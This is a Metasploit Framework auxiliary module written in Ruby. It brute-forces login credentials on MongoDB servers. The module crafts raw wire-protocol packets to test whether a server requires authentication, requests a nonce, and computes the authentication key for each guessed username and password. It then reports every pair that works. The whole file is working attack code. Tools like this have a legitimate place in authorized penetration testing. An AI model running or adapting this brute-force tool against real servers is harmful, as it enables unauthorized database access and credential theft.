##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'MongoDB Login Utility',
      'Description'  => %q{
        This module attempts to brute force authentication credentials for MongoDB.
        Note that, by default, MongoDB does not require authentication.
      },
      'References'     =>
        [
          [ 'URL', 'http://www.mongodb.org/display/DOCS/Mongo+Wire+Protocol' ],
          [ 'URL', 'http://www.mongodb.org/display/DOCS/Implementing+Authentication+in+a+Driver' ]
        ],
      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
      'License'      => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(27017),
        OptString.new('DB', [ true, "Database to use", "admin"])
      ], self.class)

    deregister_options('RHOST')
  end

  def run_host(ip)
    print_status("Scanning IP: #{ip.to_s}")
    begin
      connect
      if require_auth?
        each_user_pass { |user, pass|
          do_login(user, pass)
        }
      else
        print_good("Mongo server #{ip.to_s} dosn't use authentication")
      end
      disconnect
    rescue ::Exception => e
      print_error "Unable to connect: #{e.to_s}"
      return
    end
  end

  def require_auth?
    request_id = Rex::Text.rand_text(4)
    packet =  "\x3f\x00\x00\x00"   #messageLength (63)
    packet << request_id           #requestID
    packet << "\xff\xff\xff\xff"   #responseTo
    packet <<  "\xd4\x07\x00\x00"  #opCode (2004 OP_QUERY)
    packet << "\x00\x00\x00\x00"   #flags
    packet << "\x61\x64\x6d\x69\x6e\x2e\x24\x63\x6d\x64\x00" #fullCollectionName (admin.$cmd)
    packet << "\x00\x00\x00\x00"   #numberToSkip (0)
    packet << "\x01\x00\x00\x00"   #numberToReturn (1)
    #query ({"listDatabases"=>1})
    packet << "\x18\x00\x00\x00\x10\x6c\x69\x73\x74\x44\x61\x74\x61\x62\x61\x73\x65\x73\x00\x01\x00\x00\x00\x00"

    sock.put(packet)
    response = sock.recv(1024)

    have_auth_error?(response)
  end

  def do_login(user, password)
    vprint_status("Trying user: #{user}, password: #{password}")
    nonce = get_nonce
    status = auth(user, password, nonce)
    return status
  end

  def auth(user, password, nonce)
    request_id = Rex::Text.rand_text(4)
    packet =  request_id           #requestID
    packet << "\xff\xff\xff\xff"   #responseTo
    packet <<  "\xd4\x07\x00\x00"  #opCode (2004 OP_QUERY)
    packet << "\x00\x00\x00\x00"   #flags
    packet << datastore['DB'] + ".$cmd" + "\x00" #fullCollectionName (DB.$cmd)
    packet << "\x00\x00\x00\x00"   #numberToSkip (0)
    packet << "\xff\xff\xff\xff"   #numberToReturn (1)

    #{"authenticate"=>1.0, "user"=>"root", "nonce"=>"94e963f5b7c35146", "key"=>"61829b88ee2f8b95ce789214d1d4f175"}
    document =  "\x01\x61\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x65"
    document << "\x00\x00\x00\x00\x00\x00\x00\xf0\x3f\x02\x75\x73\x65\x72\x00"
    document << [user.length + 1].pack("L") # +1 due null byte termination
    document << user + "\x00"
    document << "\x02\x6e\x6f\x6e\x63\x65\x00\x11\x00\x00\x00"
    document << nonce + "\x00"
    document << "\x02\x6b\x65\x79\x00\x21\x00\x00\x00"
    document << Rex::Text.md5(nonce + user + Rex::Text.md5(user + ":mongo:" + password)) + "\x00"
    document << "\x00"
    #Calculate document length
    document.insert(0, [document.length + 4].pack("L"))

    packet += document

    #Calculate messageLength
    packet.insert(0, [(packet.length + 4)].pack("L"))  #messageLength
    sock.put(packet)
    response = sock.recv(1024)
    unless have_auth_error?(response)
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}'")
      report_auth_info({
        :host        => rhost,
        :port        => rport,
        :sname       => 'mongodb',
        :user        => user,
        :pass        => password,
        :source_type => 'user_supplied',
        :active      => true
      })
      return :next_user
    end

    return
  end

  def get_nonce
    request_id = Rex::Text.rand_text(4)
    packet =  "\x3d\x00\x00\x00"   #messageLength (61)
    packet << request_id           #requestID
    packet << "\xff\xff\xff\xff"   #responseTo
    packet <<  "\xd4\x07\x00\x00"  #opCode (2004 OP_QUERY)
    packet << "\x00\x00\x00\x00"   #flags
    packet << "\x74\x65\x73\x74\x2e\x24\x63\x6d\x64\x00" #fullCollectionName (test.$cmd)
    packet << "\x00\x00\x00\x00"   #numberToSkip (0)
    packet << "\x01\x00\x00\x00"   #numberToReturn (1)
    #query {"getnonce"=>1.0}
    packet << "\x17\x00\x00\x00\x01\x67\x65\x74\x6e\x6f\x6e\x63\x65\x00\x00\x00\x00\x00\x00\x00\xf0\x3f\x00"

    sock.put(packet)
    response = sock.recv(1024)
    documents = response[36..1024]
    #{"nonce"=>"f785bb0ea5edb3ff", "ok"=>1.0}
    nonce = documents[15..30]
  end

  def have_auth_error?(response)
    #Response header 36 bytes long
    documents = response[36..1024]
    #{"errmsg"=>"auth fails", "ok"=>0.0}
    #{"errmsg"=>"need to login", "ok"=>0.0}
    if documents.include?('errmsg')
      return true
    else
      return false
    end
  end
end
